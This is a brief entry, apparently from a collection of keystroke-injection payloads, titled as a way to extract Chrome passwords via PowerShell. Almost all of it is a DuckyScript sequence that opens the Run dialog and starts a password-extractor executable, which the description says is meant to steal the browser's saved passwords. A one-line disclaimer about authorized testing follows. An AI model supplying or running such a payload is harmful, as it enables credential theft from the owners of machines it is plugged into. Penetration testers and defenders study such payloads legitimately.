# Extracting Passwords from Chrome via PowerShell

Executes a Chrome password extractor tool to steal saved passwords from the Chrome browser.

```
DELAY 500
GUI r
DELAY 200
STRING powershell -Command "Start-Process 'C:\\path\\to\\chrome_password_extractor.exe'"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.